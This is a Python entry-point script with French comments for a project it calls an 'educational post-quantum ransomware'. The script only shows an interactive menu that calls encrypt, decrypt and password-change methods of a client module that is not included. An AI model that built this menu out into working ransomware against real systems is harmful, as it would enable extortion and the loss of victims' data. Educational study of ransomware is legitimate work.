#!/usr/bin/env python3
"""
Point d'entrée principal pour le ransomware post-quantique (éducatif)
Menu interactif pour tester toutes les fonctionnalités
"""

import sys
import os
from pathlib import Path

from client import RansomwareClient


def print_banner():
    print("RANSOMWARE POST-QUANTIQUE")
    print()


def print_menu():
    """Affiche le menu principal"""
    print("\nMENU PRINCIPAL")
    print("-" * 70)
    print("1. Chiffrer un dossier")
    print("2. Déchiffrer un dossier ou sous-dossier")
    print("3. Déchiffrer un fichier")
    print("4. Changer le mot de passe")
    print("5. Quitter")
    print("-" * 70)


def get_input(prompt: str, default: str = None) -> str:
    """
    Demande input user

    Args:
        prompt: Message à afficher
        default: Valeur par défaut
    Returns:
        Valeur saisie ou valeur par défaut
    """
    if default:
        full_prompt = f"{prompt} [{default}]: "
    else:
        full_prompt = f"{prompt}: "

    value = input(full_prompt).strip()

    if not value and default:
        return default

    return value


def main():
    print_banner()

    # Initialise client dans répertoire
    client = RansomwareClient(".")

    while True:
        print_menu()

        choice = input("Choix: ").strip()

        try:
            if choice == "1":
                # Chiffrer un dossier
                print("\nCHIFFREMENT D'UN DOSSIER")
                path = get_input("Chemin du dossier à chiffrer")

                if not os.path.exists(path):
                    print(f"Erreur : Le dossier '{path}' n'existe pas")
                    continue

                client.encrypt_directory(path)

            elif choice == "2":
                # Déchiffrer tout
                print("\nDÉCHIFFREMENT COMPLET")
                path = get_input("Chemin du dossier à déchiffrer")

                if not os.path.exists(path):
                    print(f"Erreur : Le dossier '{path}' n'existe pas")
                    continue

                client.decrypt_all(path)

            elif choice == "3":
                # Déchiffrer un fichier avec mot de passe
                print("\nDÉCHIFFREMENT D'UN FICHIER AVEC MOT DE PASSE")
                file_path = get_input("Chemin du fichier à déchiffrer")

                if not file_path:
                    print("Erreur : Aucun chemin de fichier donné")
                    continue

                client.decrypt_file_with_password(file_path)

            elif choice == "4":
                # Changer mdp
                print("\nCHANGEMENT DE MOT DE PASSE")

                client.change_password()

            elif choice == "5":
                # Quitter
                print("\nQuitter")
                sys.exit(0)

            else:
                print("Choix invalide")

        except KeyboardInterrupt:
            print("\n\nStop")
            sys.exit(0)

        except Exception as e:
            print(f"\n[ERR] erreur : {e}")
            import traceback
            traceback.print_exc()


if __name__ == "__main__":
    main()
